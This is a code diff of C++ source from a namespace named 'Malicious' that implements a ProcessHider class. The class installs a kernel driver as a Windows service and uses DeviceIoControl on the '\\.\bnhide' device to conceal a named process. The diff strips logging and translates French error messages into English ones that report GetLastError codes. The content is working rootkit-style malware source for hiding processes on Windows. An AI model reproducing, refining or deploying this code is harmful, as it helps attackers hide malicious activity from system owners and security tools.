@@ -22,16 +22,8 @@ namespace Malicious
         wchar_t name[MAXLEN_NAME];
     } DATA_SURVEY, *PDATA_SURVEY;
     
-    ProcessHider::DriverError::DriverError(const std::string& argMsgError)
-		: Exception(argMsgError)
-    {
-        LOG_LAST_ERROR();
-		LOG << argMsgError;
-    }
-
     ProcessHider::ProcessHider()
     {
-		LOG_THIS_FUNCTION
 		std::string windownPath;
 		System::getWindowsPath(windownPath);
         driverPath = windownPath + "\\" + SYS_DRIVER_FILENAME;
@@ -46,18 +38,16 @@ namespace Malicious
 
     ProcessHider::~ProcessHider()
     {
-		LOG_THIS_FUNCTION
         closeService();
         closeServiceManager();
     }
 
     void ProcessHider::hide(const std::string& processName)
     {
-		LOG_THIS_FUNCTION
         HANDLE hdev = CreateFile("\\\\.\\bnhide", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
         if(hdev == INVALID_HANDLE_VALUE)
         {
-            throw DriverError("Impossible de creer le fichier peripherique pour le driver.");
+            throw DriverError("Unable to create device file (CreateFile) : "+to_string(GetLastError()));
         }
 
         DATA_SURVEY dts;
@@ -75,16 +65,14 @@ namespace Malicious
         DWORD d = 0;
         BOOL b = DeviceIoControl(hdev, (DWORD) IOCTL_NAME_PRCSS, &dts, sizeof(DATA_SURVEY), 0, 0, &d, 0);
         CloseHandle(hdev);
-
         if(!b)
         {
-			throw DriverError("Impossible de commander le driver.");
+			throw DriverError("DeviceIoControl failed : "+to_string(GetLastError()));
         }
     }
 
     void ProcessHider::remove()
     {
-		LOG_THIS_FUNCTION
         openServiceManager();
         openService();
         stopService();
@@ -94,39 +82,34 @@ namespace Malicious
 
     void ProcessHider::openServiceManager()
     {
-		LOG_THIS_FUNCTION
         manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if(!manager)
         {
-            throw DriverError("Impossible d'ouvrir le service manager.");
+            throw DriverError("OpenSCManager failed : "+to_string(GetLastError()));
         }
     }
     
     void ProcessHider::closeServiceManager()
     {
-		LOG_THIS_FUNCTION
         CloseServiceHandle(manager);
     }
 
     void ProcessHider::openService()
     {
-		LOG_THIS_FUNCTION
         service = OpenService(manager, sznamesys, SERVICE_ALL_ACCESS);
         if(!service)
         {
-            throw DriverError("Impossible d'ouvrir le service.");
+            throw DriverError("OpenService failed : "+to_string(GetLastError()));
         }
     }
 
     void ProcessHider::closeService()
     {
-		LOG_THIS_FUNCTION
         CloseServiceHandle(service);
     }
 
     void ProcessHider::startService()
     {
-		LOG_THIS_FUNCTION
         service = CreateService(
 			manager, 
 			sznamesys,
@@ -142,17 +125,17 @@ namespace Malicious
 			DWORD lastError = GetLastError();
             if(lastError == ERROR_SERVICE_EXISTS)
             {
-                LOG << "Le service existe deja.";
+                LOG << "Service already exists";
                 openService();
             }
             else 
             {
-                throw DriverError("Impossible de creer le service.");
+                throw DriverError("CreateService failed : "+to_string(GetLastError()));
             }
         }
         if(!StartService(service, 0, 0))
         {
-            throw DriverError("Impossible de demarrer le serice.");
+            throw DriverError("StartService failed : "+to_string(GetLastError()));
         }
     }
 
@@ -163,7 +146,7 @@ namespace Malicious
         ControlService(service, SERVICE_CONTROL_STOP, &status);
         if(!DeleteService(service)) 
         {
-            throw DriverError("Impossible de stopper le service.");
+            throw DriverError("DeleteService failed : "+to_string(GetLastError()));
         }
     }
 } // Malicious
